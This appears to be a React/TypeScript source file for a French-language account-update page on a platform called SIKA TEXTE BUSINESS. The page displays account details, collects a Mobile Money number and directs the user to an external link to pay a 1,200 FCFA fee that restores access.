import { useState, useEffect } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { Input } from "@/components/ui/input";
import { Shield, Phone, User, CreditCard, Hash, AlertCircle, CheckCircle, ExternalLink, Loader2, Lock } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";

interface AuthUser {
  id: string;
  fullName: string;
  referralCode: string;
  phone: string;
}

interface CiStatus {
  ciUpdateRequired: boolean;
  ciUpdateLink: string;
  ciUpdateAmount: number;
}

type PageState = "form" | "payment" | "error";

export default function CiUpdatePage() {
  const { toast } = useToast();
  const [paymentPhone, setPaymentPhone] = useState("");
  const [inputError, setInputError] = useState("");
  const [pageState, setPageState] = useState<PageState>("form");
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    const t = setTimeout(() => setMounted(true), 80);
    return () => clearTimeout(t);
  }, []);

  const { data: user } = useQuery<AuthUser>({ queryKey: ['/api/auth/user'] });

  const { data: ciStatus } = useQuery<CiStatus>({
    queryKey: ['/api/user/ci-update-status'],
    refetchInterval: pageState === "payment" ? 9000 : false,
  });

  const amount = ciStatus?.ciUpdateAmount || 1200;
  const paymentLink = ciStatus?.ciUpdateLink || '#';

  const submitMutation = useMutation({
    mutationFn: async () => {
      const res = await apiRequest('POST', '/api/ci-update/submit', { paymentPhone: paymentPhone.trim() });
      return res.json();
    },
    onSuccess: () => setPageState("payment"),
    onError: () => {
      toast({ title: "Erreur d'envoi", description: "Impossible de transmettre votre demande. Veuillez réessayer.", variant: "destructive" });
    }
  });

  const handleSubmit = () => {
    if (!paymentPhone.trim()) {
      setInputError("Ce champ est requis.");
      return;
    }
    if (paymentPhone.trim().length < 8) {
      setInputError("Numéro invalide. Vérifiez et réessayez.");
      return;
    }
    setInputError("");
    submitMutation.mutate();
  };

  return (
    <div className="min-h-screen relative overflow-hidden flex items-center justify-center p-4"
      style={{ background: 'linear-gradient(135deg, #0a0e1a 0%, #0d1b3e 40%, #0a1628 70%, #060d1f 100%)' }}>

      {/* Orbes animées en arrière-plan */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none select-none">
        <div className="absolute rounded-full opacity-20"
          style={{
            width: 500, height: 500, top: '-10%', left: '-15%',
            background: 'radial-gradient(circle, #1d4ed8 0%, transparent 70%)',
            animation: 'floatA 14s ease-in-out infinite'
          }} />
        <div className="absolute rounded-full opacity-15"
          style={{
            width: 400, height: 400, top: '40%', right: '-10%',
            background: 'radial-gradient(circle, #7c3aed 0%, transparent 70%)',
            animation: 'floatB 18s ease-in-out infinite'
          }} />
        <div className="absolute rounded-full opacity-10"
          style={{
            width: 300, height: 300, bottom: '-5%', left: '30%',
            background: 'radial-gradient(circle, #0ea5e9 0%, transparent 70%)',
            animation: 'floatA 22s ease-in-out infinite reverse'
          }} />
        {/* Grille subtile */}
        <div className="absolute inset-0 opacity-5"
          style={{
            backgroundImage: `linear-gradient(rgba(99,179,237,0.3) 1px, transparent 1px), linear-gradient(90deg, rgba(99,179,237,0.3) 1px, transparent 1px)`,
            backgroundSize: '60px 60px'
          }} />
      </div>

      <style>{`
        @keyframes floatA {
          0%, 100% { transform: translate(0, 0) scale(1); }
          33% { transform: translate(30px, -30px) scale(1.05); }
          66% { transform: translate(-20px, 20px) scale(0.97); }
        }
        @keyframes floatB {
          0%, 100% { transform: translate(0, 0) scale(1); }
          50% { transform: translate(-40px, 30px) scale(1.08); }
        }
        @keyframes shimmer {
          0% { background-position: -200% center; }
          100% { background-position: 200% center; }
        }
        @keyframes fadeUp {
          from { opacity: 0; transform: translateY(28px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes scaleIn {
          from { opacity: 0; transform: scale(0.88); }
          to { opacity: 1; transform: scale(1); }
        }
        @keyframes pulse-ring {
          0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(99,102,241,0.6); }
          70% { transform: scale(1); box-shadow: 0 0 0 14px rgba(99,102,241,0); }
          100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(99,102,241,0); }
        }
        @keyframes spin-slow {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        .card-glow {
          box-shadow: 0 0 0 1px rgba(255,255,255,0.08), 0 32px 64px -12px rgba(0,0,0,0.7), 0 0 80px -20px rgba(99,102,241,0.25);
        }
        .btn-pay {
          background: linear-gradient(135deg, #1d4ed8 0%, #4f46e5 50%, #7c3aed 100%);
          box-shadow: 0 0 30px rgba(99,102,241,0.4), 0 8px 32px rgba(0,0,0,0.4);
          transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .btn-pay:hover {
          box-shadow: 0 0 50px rgba(99,102,241,0.6), 0 12px 40px rgba(0,0,0,0.5);
          transform: translateY(-2px);
        }
        .btn-submit {
          background: linear-gradient(135deg, #1e40af 0%, #3b82f6 100%);
          box-shadow: 0 4px 20px rgba(59,130,246,0.35);
          transition: all 0.25s ease;
        }
        .btn-submit:hover:not(:disabled) {
          box-shadow: 0 6px 28px rgba(59,130,246,0.55);
          transform: translateY(-1px);
        }
        .shimmer-text {
          background: linear-gradient(90deg, #93c5fd 0%, #c4b5fd 30%, #f0abfc 60%, #93c5fd 100%);
          background-size: 200% auto;
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
          animation: shimmer 4s linear infinite;
        }
        .glass {
          background: rgba(255,255,255,0.04);
          backdrop-filter: blur(24px);
          -webkit-backdrop-filter: blur(24px);
        }
        .field-glass {
          background: rgba(255,255,255,0.06) !important;
          border: 1px solid rgba(255,255,255,0.12) !important;
          color: white !important;
          transition: all 0.2s ease;
        }
        .field-glass:focus {
          background: rgba(255,255,255,0.09) !important;
          border-color: rgba(99,102,241,0.7) !important;
          box-shadow: 0 0 0 3px rgba(99,102,241,0.2) !important;
          outline: none !important;
        }
        .field-glass::placeholder { color: rgba(255,255,255,0.3) !important; }
        .info-row {
          background: rgba(255,255,255,0.03);
          border: 1px solid rgba(255,255,255,0.07);
          border-radius: 14px;
          padding: 12px 14px;
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .tag-amount {
          background: linear-gradient(90deg, rgba(251,191,36,0.15), rgba(245,158,11,0.1));
          border: 1px solid rgba(251,191,36,0.3);
          color: #fbbf24;
        }
      `}</style>

      {/* Carte principale */}
      <div className="relative w-full max-w-md card-glow rounded-3xl overflow-hidden"
        style={{
          animation: mounted ? 'scaleIn 0.5s cubic-bezier(0.34,1.56,0.64,1) forwards' : 'none',
          opacity: mounted ? 1 : 0,
          border: '1px solid rgba(255,255,255,0.1)'
        }}>

        {/* En-tête */}
        <div className="relative px-8 pt-10 pb-8 text-center overflow-hidden"
          style={{ background: 'linear-gradient(180deg, rgba(30,64,175,0.5) 0%, rgba(15,23,42,0) 100%)' }}>
          <div className="absolute inset-0" style={{
            background: 'radial-gradient(ellipse at 50% -20%, rgba(99,102,241,0.4) 0%, transparent 70%)'
          }} />

          {/* Icône animée */}
          <div className="relative mx-auto mb-5 w-20 h-20">
            <div className="absolute inset-0 rounded-full"
              style={{ animation: 'pulse-ring 2.5s ease-out infinite', background: 'rgba(99,102,241,0.3)' }} />
            <div className="relative w-20 h-20 rounded-full flex items-center justify-center"
              style={{ background: 'linear-gradient(135deg, #1e40af, #6d28d9)', border: '1px solid rgba(255,255,255,0.2)' }}>
              <Shield className="w-9 h-9 text-white" />
            </div>
          </div>

          <h1 className="text-2xl font-bold text-white tracking-tight mb-1">Mise à jour requise</h1>
          <p className="text-blue-300/70 text-xs tracking-widest uppercase font-medium">SIKA TEXTE BUSINESS</p>

          {/* Montant badge */}
          <div className="inline-flex items-center gap-2 mt-4 px-4 py-1.5 rounded-full tag-amount text-sm font-semibold">
            <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-pulse" />
            {amount.toLocaleString("fr-FR")} FCFA requis
          </div>
        </div>

        {/* Corps */}
        <div className="glass px-7 pb-8 pt-2 space-y-5">

          {/* Informations du compte */}
          {user && (
            <div style={{ animation: mounted ? 'fadeUp 0.55s ease forwards' : 'none', opacity: mounted ? 1 : 0 }}>
              <p className="text-xs text-white/30 uppercase tracking-widest font-semibold mb-3">Votre compte</p>
              <div className="space-y-2">
                <div className="info-row">
                  <div className="w-8 h-8 rounded-xl flex items-center justify-center flex-shrink-0"
                    style={{ background: 'rgba(59,130,246,0.2)', border: '1px solid rgba(59,130,246,0.3)' }}>
                    <User className="w-4 h-4 text-blue-400" />
                  </div>
                  <div className="min-w-0">
                    <p className="text-white/40 text-xs leading-none mb-1">Titulaire</p>
                    <p className="text-white font-semibold text-sm truncate">{user.fullName}</p>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-2">
                  <div className="info-row">
                    <div className="w-7 h-7 rounded-lg flex items-center justify-center flex-shrink-0"
                      style={{ background: 'rgba(52,211,153,0.15)', border: '1px solid rgba(52,211,153,0.25)' }}>
                      <CreditCard className="w-3.5 h-3.5 text-emerald-400" />
                    </div>
                    <div className="min-w-0">
                      <p className="text-white/35 text-xs leading-none mb-0.5">N° Compte</p>
                      <p className="text-emerald-300 font-mono text-xs font-bold truncate">{user.referralCode || '—'}</p>
                    </div>
                  </div>
                  <div className="info-row">
                    <div className="w-7 h-7 rounded-lg flex items-center justify-center flex-shrink-0"
                      style={{ background: 'rgba(167,139,250,0.15)', border: '1px solid rgba(167,139,250,0.25)' }}>
                      <Hash className="w-3.5 h-3.5 text-violet-400" />
                    </div>
                    <div className="min-w-0">
                      <p className="text-white/35 text-xs leading-none mb-0.5">ID Compte</p>
                      <p className="text-violet-300 font-mono text-xs truncate">{user.id.substring(0, 8)}…</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* ──────── ÉTAT : FORMULAIRE ──────── */}
          {pageState === "form" && (
            <div className="space-y-4"
              style={{ animation: mounted ? 'fadeUp 0.65s ease forwards' : 'none', opacity: mounted ? 1 : 0 }}>

              {/* Note explicative */}
              <div className="rounded-2xl p-4 space-y-1 text-sm"
                style={{ background: 'rgba(251,191,36,0.07)', border: '1px solid rgba(251,191,36,0.2)' }}>
                <div className="flex items-center gap-2 text-amber-300 font-semibold text-xs mb-1">
                  <AlertCircle className="w-3.5 h-3.5" /> Action requise
                </div>
                <p className="text-white/60 text-xs leading-relaxed">
                  Pour continuer à utiliser la plateforme, veuillez effectuer la mise à jour de votre compte en réglant les frais de{" "}
                  <span className="text-amber-300 font-bold">{amount.toLocaleString("fr-FR")} FCFA</span>.
                  Votre accès sera rétabli immédiatement après validation.
                </p>
              </div>

              {/* Champ téléphone */}
              <div>
                <label className="block text-white/60 text-xs font-semibold mb-2 tracking-wide">
                  Numéro Mobile Money pour le paiement
                </label>
                <div className="relative">
                  <Phone className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30 pointer-events-none" />
                  <Input
                    type="tel"
                    value={paymentPhone}
                    onChange={(e) => { setPaymentPhone(e.target.value); if (inputError) setInputError(""); }}
                    placeholder="Ex : 0708091011"
                    className="field-glass pl-10 h-12 rounded-xl text-sm"
                  />
                </div>
                {inputError ? (
                  <p className="flex items-center gap-1.5 text-red-400 text-xs mt-2">
                    <AlertCircle className="w-3.5 h-3.5" /> {inputError}
                  </p>
                ) : (
                  <p className="text-white/30 text-xs mt-2">
                    Numéro depuis lequel vous enverrez les {amount.toLocaleString("fr-FR")} FCFA
                  </p>
                )}
              </div>

              {/* Bouton soumettre */}
              <button
                onClick={handleSubmit}
                disabled={submitMutation.isPending}
                className="btn-submit w-full h-13 rounded-2xl text-white font-bold text-sm py-4 disabled:opacity-60 disabled:cursor-not-allowed"
              >
                {submitMutation.isPending ? (
                  <span className="flex items-center justify-center gap-2">
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Envoi en cours…
                  </span>
                ) : (
                  <span className="flex items-center justify-center gap-2">
                    <Lock className="w-4 h-4" />
                    Valider et procéder au paiement
                  </span>
                )}
              </button>
            </div>
          )}

          {/* ──────── ÉTAT : PAIEMENT ──────── */}
          {pageState === "payment" && (
            <div className="space-y-4"
              style={{ animation: 'scaleIn 0.4s cubic-bezier(0.34,1.56,0.64,1) forwards' }}>

              {/* Confirmation d'envoi */}
              <div className="rounded-2xl p-4 flex items-center gap-3"
                style={{ background: 'rgba(52,211,153,0.08)', border: '1px solid rgba(52,211,153,0.25)' }}>
                <div className="w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0"
                  style={{ background: 'rgba(52,211,153,0.15)' }}>
                  <CheckCircle className="w-5 h-5 text-emerald-400" />
                </div>
                <div>
                  <p className="text-emerald-300 font-semibold text-sm">Demande transmise avec succès</p>
                  <p className="text-white/40 text-xs mt-0.5">
                    N° enregistré : <span className="text-white/70 font-mono">{paymentPhone}</span>
                  </p>
                </div>
              </div>

              {/* Lien de paiement */}
              <div className="rounded-2xl p-5 space-y-4"
                style={{ background: 'rgba(99,102,241,0.08)', border: '1px solid rgba(99,102,241,0.25)' }}>
                <div className="text-center">
                  <p className="text-white/50 text-xs uppercase tracking-widest mb-1">Étape suivante</p>
                  <p className="text-white font-bold text-base">Effectuez votre paiement</p>
                  <p className="text-white/40 text-xs mt-1">
                    Réglez <span className="text-indigo-300 font-bold">{amount.toLocaleString("fr-FR")} FCFA</span> via le lien ci-dessous
                  </p>
                </div>

                <a
                  href={paymentLink}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="btn-pay flex items-center justify-center gap-3 w-full py-4 rounded-2xl text-white font-bold text-base"
                >
                  <span className="shimmer-text text-base font-extrabold">
                    Payer {amount.toLocaleString("fr-FR")} FCFA
                  </span>
                  <ExternalLink className="w-5 h-5 text-white/80 flex-shrink-0" />
                </a>
              </div>

              {/* Attente validation */}
              <div className="rounded-2xl p-4 flex items-center gap-3"
                style={{ background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.08)' }}>
                <div className="relative flex-shrink-0">
                  <div className="w-8 h-8 rounded-full border-2 border-blue-500/30 border-t-blue-400"
                    style={{ animation: 'spin-slow 1.5s linear infinite' }} />
                </div>
                <div>
                  <p className="text-white/70 text-xs font-medium">En attente de validation</p>
                  <p className="text-white/35 text-xs mt-0.5">
                    Votre accès sera rétabli automatiquement dès confirmation.
                  </p>
                </div>
              </div>

              <button
                onClick={() => setPageState("form")}
                className="w-full text-xs text-white/25 hover:text-white/50 transition-colors py-2"
              >
                ← Modifier ma demande
              </button>
            </div>
          )}

          {/* ──────── ÉTAT : ERREUR ──────── */}
          {pageState === "error" && (
            <div className="text-center space-y-4 py-3">
              <div className="w-14 h-14 mx-auto rounded-full flex items-center justify-center"
                style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.2)' }}>
                <AlertCircle className="w-7 h-7 text-red-400" />
              </div>
              <div>
                <p className="text-white font-semibold">Une erreur est survenue</p>
                <p className="text-white/40 text-sm mt-1">Vérifiez votre connexion et réessayez.</p>
              </div>
              <button
                onClick={() => setPageState("form")}
                className="px-6 py-2.5 rounded-xl text-sm font-semibold text-white transition-all"
                style={{ background: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.15)' }}
              >
                Réessayer
              </button>
            </div>
          )}
        </div>

        {/* Pied de carte */}
        <div className="px-7 pb-6 pt-0">
          <div className="flex items-center justify-center gap-2 text-white/20 text-xs">
            <Shield className="w-3 h-3" />
            <span>Procédure sécurisée — SIKA TEXTE BUSINESS</span>
          </div>
        </div>
      </div>
    </div>
  );
}
